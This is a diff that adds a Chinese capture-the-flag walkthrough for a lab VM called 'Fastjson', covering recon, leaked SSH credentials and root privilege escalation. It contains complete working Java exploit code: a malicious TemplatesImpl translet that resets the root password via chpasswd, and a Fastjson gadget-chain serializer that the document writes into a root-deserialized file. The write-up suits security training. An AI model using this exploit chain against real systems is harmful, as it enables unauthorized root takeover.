@@ -1,5 +1,501 @@
-<!-- ##{"script":"<script src='https://7r1umphk.github.io/plugins/jiami.js'></script>"}## -->
-<!--encrypt: e08c4f7b-->
-<!--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-->
-<!--/encrypt-->
-遇到问题先自己解决。
+## Nmap
+
+先扫全端口：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ nmap -p0-65535 192.168.205.220
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 00:17 -0400
+Nmap scan report for 192.168.205.220
+Host is up (0.0010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+MAC Address: 08:00:27:98:5E:D0 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 5.23 seconds
+```
+
+开放了 `22/80/8080`，优先看 Web。
+
+## Web
+
+80 端口只有一个很简单的首页：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl 192.168.205.220 -i
+HTTP/1.1 200 OK
+Date: Wed, 10 Jun 2026 04:17:25 GMT
+Server: Apache/2.4.67 (Unix)
+Last-Modified: Sat, 25 Apr 2026 10:23:33 GMT
+ETag: "6-650464614f50d"
+Accept-Ranges: bytes
+Content-Length: 6
+Content-Type: text/html
+
+index
+```
+
+目录扫描：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ dirsearch -q -u 192.168.205.220
+[00:17:39] 200 -  820B  - http://192.168.205.220/cgi-bin/printenv
+[00:17:39] 200 -    1KB - http://192.168.205.220/cgi-bin/test-cgi
+[00:17:46] 403 -  318B  - http://192.168.205.220/server-status/
+```
+
+80 上只有 CGI 环境信息，暂时没有直接利用点，重点放到 8080。
+
+访问 8080：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl 192.168.205.220:8080 -i
+HTTP/1.1 200
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Wed, 10 Jun 2026 04:17:30 GMT
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>公交车之谜</title>
+...
+```
+
+页面是一个“公交车之谜”，表单提交到 `/`：
+
+```html
+<form action="/" method="post">
+    <input type="number" name="answer" placeholder="输入数字" required>
+</form>
+```
+
+题目提示：
+
+```text
+3 - 1 + 0.5 - 2 = ?
+```
+
+数学答案是 `0.5`，但是只接收整数。
+
+```js
+const userAnswer = parseInt(answerInput.value);
+```
+
+直接对后端测试：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ echo "=== 0.5 ==="; curl -s -i -X POST http://192.168.205.220:8080/ --data-urlencode 'answer=0.5'
+echo "=== 0 ==="; curl -s -i -X POST http://192.168.205.220:8080/ --data-urlencode 'answer=0'
+
+=== 0.5 ===
+HTTP/1.1 302
+Location: http://192.168.205.220:8080/baka
+Content-Language: en-US
+Content-Length: 0
+Date: Wed, 10 Jun 2026 04:21:13 GMT
+
+=== 0 ===
+HTTP/1.1 302
+Location: http://192.168.205.220:8080/quiz2jkdjw
+Content-Language: en-US
+Content-Length: 0
+Date: Wed, 10 Jun 2026 04:21:13 GMT
+```
+
+访问第二关：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl http://192.168.205.220:8080/quiz2jkdjw
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>琪露诺的Java魔法教室</title>
+...
+```
+
+题目内容是：
+
+```text
+Class.forName() 和 ClassLoader.loadClass()
+哪个会触发类的初始化阶段？
+```
+
+正确答案是 `Class.forName()`，提交：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl -s -i -X POST http://192.168.205.220:8080/quiz2jkdjw --data-urlencode 'answer=forName'
+HTTP/1.1 200
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Wed, 10 Jun 2026 04:21:58 GMT
+
+<!DOCTYPE html>
+...
+<!--Cirno:999999999-->
+</body>
+</html>
+```
+
+页面注释直接给出了 SSH 凭据`Cirno:999999999`
+
+## SSH
+
+使用泄露的账号密码登录：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ssh Cirno@192.168.205.220
+Cirno@192.168.205.220's password: 999999999
+              _
+__      _____| | ___ ___  _ __ ___   ___
+\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
+ \ V  V /  __/ | (_| (_) | | | | | |  __/
+  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
+
+Cirno@Fastjson:~$ id
+uid=1000(Cirno) gid=1000(Cirno) groups=1000(Cirno)
+```
+
+读取 user flag：
+
+```bash
+Cirno@Fastjson:~$ cat user.txt
+flag{f176c3af829faae619fb3d3b9aa6ae77}
+```
+
+## 枚举
+
+先看 sudo：
+
+```bash
+Cirno@Fastjson:~$ sudo -l
+[sudo] password for Cirno:
+Sorry, user Cirno may not run sudo on Fastjson.
+```
+
+没有 sudo 权限。
+
+枚举时有几个很扎眼的点：
+
+```text
+1. root 在跑 java -jar /root/web.jar
+2. /usr/1.txt 为 root 拥有但全员可写
+3. /var/opt/999.jar 和 /var/opt/tt.java 存在
+4. /Baka* 文件持续被 root 生成
+```
+
+root 进程：
+
+```bash
+PID   USER     TIME  COMMAND
+2298  root     0:57  java -jar /root/web.jar
+```
+
+异常文件：
+
+```bash
+Cirno@Fastjson:~$ ls -al /usr/1.txt
+-rwxrwxrwx    1 root     root          3792 Jun  1 10:50 /usr/1.txt
+```
+
+文件内容开头：
+
+```bash
+Cirno@Fastjson:~$ head -c 20 /usr/1.txt; echo
+rO0ABXNyAC5qYXZhe
+```
+
+`rO0AB` 是非常典型的 Java 序列化流经过 base64 编码后的特征。
+
+根目录下还有一批 root 创建的空文件：
+
+```bash
+Cirno@Fastjson:/$ ls -al /Baka*
+-rw-r--r--    1 root     root             0 Jun 10 12:11 /Baka0
+-rw-r--r--    1 root     root             0 Jun 10 12:18 /Baka19
+-rw-r--r--    1 root     root             0 Jun 10 12:19 /Baka2
+-rw-r--r--    1 root     root             0 Jun 10 12:20 /Baka23
+-rw-r--r--    1 root     root             0 Jun 10 12:22 /Baka98
+...
+```
+
+结合 Web 题面中的 `baka` 元素，这些文件很像是某个命令执行 payload 的产物。
+
+再用 pspy 看 root 定时任务：
+
+```bash
+Cirno@Fastjson:/tmp$ ./pspy64
+2026/06/10 12:29:00 CMD: UID=0     PID=26143  | /bin/bash -c /usr/lib/jvm/java-1.8-openjdk/bin/java -jar /var/opt/999.jar
+2026/06/10 12:30:00 CMD: UID=0     PID=26158  | /usr/sbin/crond -c /etc/crontabs -f
+```
+
+也就是 root 每分钟都会执行一次：
+
+```bash
+/usr/lib/jvm/java-1.8-openjdk/bin/java -jar /var/opt/999.jar
+```
+
+## 999.jar
+
+查看 `/var/opt`：
+
+```bash
+Cirno@Fastjson:/var/opt$ ls -al
+total 552
+drwxr-xr-x    2 root     root          4096 May 28 12:30 .
+drwxr-xr-x   13 root     root          4096 May  8 10:51 ..
+-rw-r--r--    1 root     root        550077 May 28 12:26 999.jar
+-rw-r--r--    1 root     root           605 May 28 12:30 tt.java
+```
+
+源码直接可读：
+
+```bash
+Cirno@Fastjson:/var/opt$ cat /var/opt/tt.java
+import java.io.*;
+import java.util.Base64;
+import java.util.Scanner;
+
+public class tt {
+    public static void main(String[] args) throws Exception{
+        Scanner scanner = new Scanner(new File("/usr/1.txt")).useDelimiter("\\A");
+        if(scanner.hasNext()){
+            String data = scanner.next();
+            System.out.println(data);
+            byte[] ass = Base64.getDecoder().decode(data);
+            ByteArrayInputStream bais = new ByteArrayInputStream(ass);
+            ObjectInputStream ois = new ObjectInputStream(bais);
+            ois.readObject();
+        }
+
+    }
+}
+```
+
+逻辑很清晰：
+
+```text
+读取 /usr/1.txt
+-> base64 解码
+-> ObjectInputStream.readObject()
+```
+
+因此这题的本地提权本质就是：
+
+```text
+控制 /usr/1.txt
+-> 让 root 定时反序列化我们构造的对象
+```
+
+把 jar 拷到 `/tmp` 解开看依赖：
+
+```bash
+Cirno@Fastjson:/tmp$ cp /var/opt/999.jar .
+Cirno@Fastjson:/tmp$ unzip -q 999.jar
+Cirno@Fastjson:/tmp$ unzip -p 999.jar META-INF/MANIFEST.MF
+Manifest-Version: 1.0
+Build-Jdk-Spec: 1.8
+Created-By: Maven Archiver 3.6.0
+Main-Class: tt
+```
+
+jar 里带了完整 Fastjson：
+
+```bash
+Cirno@Fastjson:/tmp$ find . -name "*.class" | grep 'com/alibaba/fastjson' | head
+./com/alibaba/fastjson/JSONPath$MultiPropertySegement.class
+./com/alibaba/fastjson/JSONPath$MatchSegement.class
+./com/alibaba/fastjson/JSONObject.class
+./com/alibaba/fastjson/JSONWriter.class
+./com/alibaba/fastjson/JSONArray.class
+./com/alibaba/fastjson/JSON.class
+...
+```
+
+但没有 commons-beanutils / commons-collections：
+
+```bash
+Cirno@Fastjson:/tmp$ find /tmp -name '*.class' | grep -i 'beanutils\|collections'
+find: /tmp/tomcat-docbase.8080.221391655880685456: Permission denied
+find: /tmp/tomcat.8080.311519346083039616: Permission denied
+```
+
+所以常规 ysoserial 链如 `CommonsBeanutils1` 会失败：
+
+```bash
+Exception in thread "main" java.lang.ClassNotFoundException: org.apache.commons.beanutils.BeanComparator
+```
+
+而 `Jdk7u21` 在目标 Java 8 上也不成立：
+
+```bash
+Exception in thread "main" java.io.InvalidObjectException: Non-annotation type in annotation serial stream
+```
+
+说明这题真正可用的链，不是通用 ysoserial，而是和原始 `/usr/1.txt` 一样的结构：
+
+```text
+BadAttributeValueExpException
+-> fastjson JSONObject
+-> TemplatesImpl
+-> 加载恶意字节码
+```
+
+## Payload
+
+### 编写恶意字节码类
+
+在靶机 `/tmp` 下写一个继承 `AbstractTranslet` 的类，静态代码块里执行 `chpasswd`：
+
+```java
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class Pwn extends AbstractTranslet {
+    static {
+        try {
+            Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","printf 'root:root123\\n' | chpasswd"}).waitFor();
+        } catch (Exception e) {}
+    }
+
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
+}
+```
+
+保存为 `/tmp/Pwn.java` 后编译：
+
+```bash
+/usr/lib/jvm/java-1.8-openjdk/bin/javac -XDignore.symbol.file /tmp/Pwn.java
+```
+
+确认 class 已生成：
+
+```bash
+Cirno@Fastjson:/tmp$ ls -l /tmp/Pwn.class
+-rw-r--r--    1 Cirno    Cirno         1078 Jun 10 12:56 /tmp/Pwn.class
+```
+
+### 编写序列化生成器
+
+再写一个本地生成器，把 `Pwn.class` 塞进 `TemplatesImpl`，再用 `fastjson.JSONObject` 包裹，最后挂到 `BadAttributeValueExpException.val` 上并序列化输出。
+
+生成器源码如下：
+
+```java
+import com.alibaba.fastjson.JSONObject;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javax.management.BadAttributeValueExpException;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+public class Gen {
+    static void set(Object o, String n, Object v) throws Exception {
+        Field f = o.getClass().getDeclaredField(n);
+        f.setAccessible(true);
+        f.set(o, v);
+    }
+
+    public static void main(String[] a) throws Exception {
+        byte[] b = Files.readAllBytes(Paths.get("/tmp/Pwn.class"));
+
+        TemplatesImpl t = new TemplatesImpl();
+        set(t, "_bytecodes", new byte[][]{b});
+        set(t, "_name", "Pwn");
+        set(t, "_tfactory", new TransformerFactoryImpl());
+
+        JSONObject j = new JSONObject();
+        j.put("x", t);
+
+        BadAttributeValueExpException e = new BadAttributeValueExpException(null);
+        Field f = BadAttributeValueExpException.class.getDeclaredField("val");
+        f.setAccessible(true);
+        f.set(e, j);
+
+        ByteArrayOutputStream bo = new ByteArrayOutputStream();
+        ObjectOutputStream oo = new ObjectOutputStream(bo);
+        oo.writeObject(e);
+        oo.close();
+
+        System.out.print(Base64.getEncoder().encodeToString(bo.toByteArray()));
+    }
+}
+```
+
+保存为 `/tmp/Gen.java`，编译时把 `999.jar` 加入 classpath：
+
+```bash
+Cirno@Fastjson:/tmp$ /usr/lib/jvm/java-1.8-openjdk/bin/javac -XDignore.symbol.file -cp /var/opt/999.jar /tmp/Gen.java
+```
+
+然后生成 payload 覆盖 `/usr/1.txt`：
+
+```bash
+Cirno@Fastjson:/tmp$ /usr/lib/jvm/java-1.8-openjdk/bin/java -cp /tmp:/var/opt/999.jar Gen > /usr/1.txt
+```
+
+确认内容是纯净的 base64：
+
+```bash
+tr -d 'A-Za-z0-9+/=' < /usr/1.txt | xxd
+```
+
+没有输出就说明没有脏字符，可以正常被 `Base64.getDecoder()` 解析。
+
+## Root
+
+可以等 cron 下一分钟自动触发，也可以直接手工执行测试：
+
+```bash
+Cirno@Fastjson:/tmp$ /usr/lib/jvm/java-1.8-openjdk/bin/java -jar /var/opt/999.jar
+```
+
+这一步会让 root 进程反序列化我们写入的对象，加载 `Pwn.class`，执行静态代码块，把 root 密码改成：
+
+```text
+root123
+```
+
+等cron触发，然后直接切换 root：
+
+```bash
+Cirno@Fastjson:/tmp$ su root
+Password: root123
+Fastjson:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+也可以直接 SSH：
+
+```bash
+ssh root@192.168.205.220
+```
+
+读取 root flag：
+
+```bash
+Fastjson:~# cat /root/root.txt
+flag{f8b134c9e5c4ab3c9787c29effad5e6a}
+```
